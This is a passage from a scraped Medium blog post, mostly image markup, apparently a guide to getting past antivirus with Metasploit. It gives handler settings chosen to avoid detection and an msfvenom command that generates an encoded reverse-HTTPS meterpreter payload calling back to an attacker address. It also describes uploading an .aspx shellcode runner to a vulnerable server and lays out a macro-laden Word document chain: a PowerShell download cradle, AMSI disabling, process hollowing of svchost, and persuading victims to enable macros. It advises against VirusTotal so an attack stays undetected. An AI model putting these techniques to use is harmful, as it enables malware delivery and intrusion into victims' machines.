https://miro.medium.com/v2/resize:fit:828/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 828w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 414px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*M3gXVY8ivWG792ybLwvhLw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*M3gXVY8ivWG792ybLwvhLw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*M3gXVY8ivWG792ybLwvhLw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*M3gXVY8ivWG792ybLwvhLw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*M3gXVY8ivWG792ybLwvhLw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*M3gXVY8ivWG792ybLwvhLw.png 1100w, https://miro.medium.com/v2/resize:fit:828/1*M3gXVY8ivWG792ybLwvhLw.png 828w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 414px"><img alt="" class="be lt nx c" width="414" height="92" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:518/1*M3gXVY8ivWG792ybLwvhLw.png"></picture></div></figure><h2 id="a590" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">LISTENER</h2><p id="1df1" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">There are some advanced options in the <strong class="mo hb">Metasploit </strong><code class="cu wp wq wr wf b">multi/handler</code> module that can help you bypass anti-virus. The first of them is the <strong class="mo hb">SSL option</strong>. When set to <code class="cu wp wq wr wf b">true</code> you listener will be using <strong class="mo hb">SSL for the connection</strong>. You can use created above custom <strong class="mo hb">self-signed certificate</strong> for this purpose.</p><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="8e6c" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">set payload windows/x64/meterpreter/reverse_https<br>set SSL true<br>set HandlerSSLCert /home/karmaz95/custom.pem</span></pre><p id="706d" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">Another very handy option is to <strong class="mo hb">turn off autoloading</strong> of <code class="cu wp wq wr wf b">stdapi</code> which is responsible to load the default commands of the meterpreter. When loaded, it <strong class="mo hb">reserves a space in memory to load meterpreter functions</strong>. Anti-viruses scan all the process memory for this signature and can detect that as malicious. If you set it to false, the meterpreter will behave like a common connection. After getting the reverse shell, you can load <code class="cu wp wq wr wf b">stdapi</code> manually.</p><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="416c" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">set AutoLoadStdapi false</span></pre><p id="e0a6" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph=""><code class="cu wp wq wr wf b">AutoVerifySession</code> option makes the meterpreter send another connection after establishing the first connection to see if it is alive. It can be detected too.</p><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="8616" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">set AutoVerifySession false</span></pre><p id="66fa" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">The last two options should be used if you are using a staged payload because it <strong class="mo hb">encodes the second stage</strong> of your meterpreter shellcode.</p><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="9a20" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">set EnableStageEncoding True<br>set StagerEncoder x64/xor_dynamic</span></pre><blockquote class="wm wn wo"><p id="76a3" class="mm mn wd mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">Here the question may come to your mind why not to use heavily encoded single-stage shellcode. There is one major advantage to using staged shellcode and this is the size of the first stage in memory — the fewer bytes the smaller the possibility to detect the malicious code and more time to migrate to another process or <a class="af te" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/malware-development/code-injection/process-hollowing" rel="noopener ugc nofollow" target="_blank">hollowing the process</a> that bypasses the anti-virus entirely.</p></blockquote><p id="9b32" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">As you can see after starting the listener and then uploading the malicious shellcode runner <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/platform.aspx" rel="noopener ugc nofollow" target="_blank">platform.aspx</a></code> to the vulnerable web server, you gained reverse shell.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xc"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cpS5CHLuC2SKl9hax8HGvw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*cpS5CHLuC2SKl9hax8HGvw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*cpS5CHLuC2SKl9hax8HGvw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*cpS5CHLuC2SKl9hax8HGvw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*cpS5CHLuC2SKl9hax8HGvw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*cpS5CHLuC2SKl9hax8HGvw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*cpS5CHLuC2SKl9hax8HGvw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*cpS5CHLuC2SKl9hax8HGvw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="283" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*cpS5CHLuC2SKl9hax8HGvw.png"></picture></div></div></figure><p id="09d2" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">The last step is to load the <code class="cu wp wq wr wf b">stdapi</code> to enable meterpreter functionality.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tcujDtlgRZR-iHaYI-oXFQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*tcujDtlgRZR-iHaYI-oXFQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*tcujDtlgRZR-iHaYI-oXFQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*tcujDtlgRZR-iHaYI-oXFQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*tcujDtlgRZR-iHaYI-oXFQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*tcujDtlgRZR-iHaYI-oXFQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*tcujDtlgRZR-iHaYI-oXFQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*tcujDtlgRZR-iHaYI-oXFQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="98" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*tcujDtlgRZR-iHaYI-oXFQ.png"></picture></div></div></figure><h1 id="aa12" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">SCORE?</h1><p id="f88f" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">The <a class="af te" href="https://antiscan.me/" rel="noopener ugc nofollow" target="_blank">https://antiscan.me/</a>, unfortunately, do not have the option to scan <code class="cu wp wq wr wf b">.aspx</code> files, but you can use another accepted format to evade this. It certainly will not be as exact as with the correct format, but it is always worth checking out. Especially if you want to check the ELF binary files.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xe"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J3YS4zdmSaQVac4w9V_4ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*J3YS4zdmSaQVac4w9V_4ug.png 640w, https://miro.medium.com/v2/resize:fit:720/1*J3YS4zdmSaQVac4w9V_4ug.png 720w, https://miro.medium.com/v2/resize:fit:750/1*J3YS4zdmSaQVac4w9V_4ug.png 750w, https://miro.medium.com/v2/resize:fit:786/1*J3YS4zdmSaQVac4w9V_4ug.png 786w, https://miro.medium.com/v2/resize:fit:828/1*J3YS4zdmSaQVac4w9V_4ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*J3YS4zdmSaQVac4w9V_4ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*J3YS4zdmSaQVac4w9V_4ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="834" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*J3YS4zdmSaQVac4w9V_4ug.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph=""><a class="af te" href="https://antiscan.me/images/result/xqQ4YNuPPjG3.png" rel="noopener ugc nofollow" target="_blank">https://antiscan.me/images/result/xqQ4YNuPPjG3.png</a></figcaption></figure><p id="47c7" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">For sure there is space for improvements, but the main target which is Windows 10 Defender is clean.</p><blockquote class="wm wn wo"><p id="1532" class="mm mn wd mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph=""><strong class="mo hb">One very important thing to mention, do not use </strong><a class="af te" href="https://www.virustotal.com/" rel="noopener ugc nofollow" target="_blank"><strong class="mo hb">VirusTotal</strong></a><strong class="mo hb"> as it updates the anti-viruses databases, which culd prevent you from successfull attack.</strong></p></blockquote><p id="d262" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">However, I do not attack anyone here and I am curious if the <a class="af te" href="https://www.virustotal.com/" rel="noopener ugc nofollow" target="_blank">VirusTotal</a> would not detect <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/platform.aspx" rel="noopener ugc nofollow" target="_blank">platform.aspx</a></code> either — which would be very strange since I did the test on updated Microsft Defender and got the shell.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZgoIA0GUd6AEFouj2IGPoA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ZgoIA0GUd6AEFouj2IGPoA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZgoIA0GUd6AEFouj2IGPoA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZgoIA0GUd6AEFouj2IGPoA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZgoIA0GUd6AEFouj2IGPoA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZgoIA0GUd6AEFouj2IGPoA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZgoIA0GUd6AEFouj2IGPoA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZgoIA0GUd6AEFouj2IGPoA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="773" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*ZgoIA0GUd6AEFouj2IGPoA.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph=""><a class="af te" href="https://www.virustotal.com/gui/file/e3fd0569bc56f6431df6b9ec22a6a72415dc2c4a6f6decaf94f3fb3514f3c629/detection" rel="noopener ugc nofollow" target="_blank">https://www.virustotal.com/gui/file/e3fd0569bc56f6431df6b9ec22a6a72415dc2c4a6f6decaf94f3fb3514f3c629/detection</a></figcaption></figure><p id="b88f" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">All right! Microsoft Defender was defeated with the <code class="cu wp wq wr wf b">platform.aspx</code> file, but what if there is no Unrestricted File Upload Vulnerability?</p><h1 id="5d1d" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">SCENARIO II</h1><p id="08e2" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">You can for example deliver the malware using <strong class="mo hb">VBA in the Word Document embedded macro</strong> (<code class="cu wp wq wr wf b">.docm</code>). Then you have to somehow convenience the victim to open the file and enable macro inside the Word Document.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UuHqlCthiF4DK8wbNJW_kA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*UuHqlCthiF4DK8wbNJW_kA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UuHqlCthiF4DK8wbNJW_kA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UuHqlCthiF4DK8wbNJW_kA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UuHqlCthiF4DK8wbNJW_kA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UuHqlCthiF4DK8wbNJW_kA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UuHqlCthiF4DK8wbNJW_kA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*UuHqlCthiF4DK8wbNJW_kA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="352" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*UuHqlCthiF4DK8wbNJW_kA.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">Example of an image inside the Word Document that could help you convince the victim.</figcaption></figure><p id="f5ea" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">There are various techniques to do it, at the moment I found the most successful way to use:</p><ul class=""><li id="e831" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph=""><strong class="mo hb">VBA macro</strong> with the <strong class="mo hb">PowerShell download cradle</strong>.</li><li id="dd53" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">The download cradle pulls the PowerShell script and runs it in memory.</li><li id="1051" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">The PowerShell script <strong class="mo hb">disables AMSI, </strong>then download&amp;load into the memory space the <strong class="mo hb">Shellcode Runner</strong>.</li><li id="613d" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph=""><strong class="mo hb">ShellCode Runner</strong> is the <strong class="mo hb">unmanaged DLL</strong> file that first does the <a class="af te" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/malware-development/code-injection/process-hollowing" rel="noopener ugc nofollow" target="_blank"><strong class="mo hb">process hollowing</strong></a> and then <strong class="mo hb">pulls the first stage of the shellcode</strong> from your web server and <strong class="mo hb">loads it in the newly created process</strong>.</li><li id="f8fb" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">This process then <strong class="mo hb">pulls the rest of the meterpreter shellcode</strong> into its memory and gives you the Reverse Shell.</li></ul><h1 id="0e2b" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">EVASIONS II</h1><p id="91df" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">I will use here all the above-described techniques enriched with additional ones, and I will describe only the additional ones.</p><h2 id="616c" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">PROCESS HOLLOWING</h2><p id="578f" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">The victim process is created in a <strong class="mo hb">suspended state</strong> (<code class="cu wp wq wr wf b">svchost.exe</code>). Its <strong class="mo hb">image</strong> <strong class="mo hb">is carved out from memory</strong> and <strong class="mo hb">malicious binary gets written instead</strong>. <br>Then the <strong class="mo hb">program state is resumed</strong> to <strong class="mo hb">execute the injected code</strong>.<br>The priority target should be <code class="cu wp wq wr wf b">svchost.exe</code> because it is by design making the TCP connections and will not be suspicious to any malicious actions.</p><ul class=""><li id="2cdf" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">First generate the C# shellcode:</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="46ce" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.29.130.103 LPORT=443 EXITFUNC=thread -f csharp -o shell.cs -e x64/zutto_dekiru -i 7</span></pre><ul class=""><li id="bfa9" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Next, encode the shellcode as previously using <a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/XOREncrypt.sln" rel="noopener ugc nofollow" target="_blank">XOREncrypt.sln</a></li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div class="nk nl xh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 1100w, https://miro.medium.com/v2/resize:fit:1062/format:webp/1*_hhkxwBFJnvNgb-1oGf2Sw.png 1062w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 531px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*_hhkxwBFJnvNgb-1oGf2Sw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*_hhkxwBFJnvNgb-1oGf2Sw.png 720w, 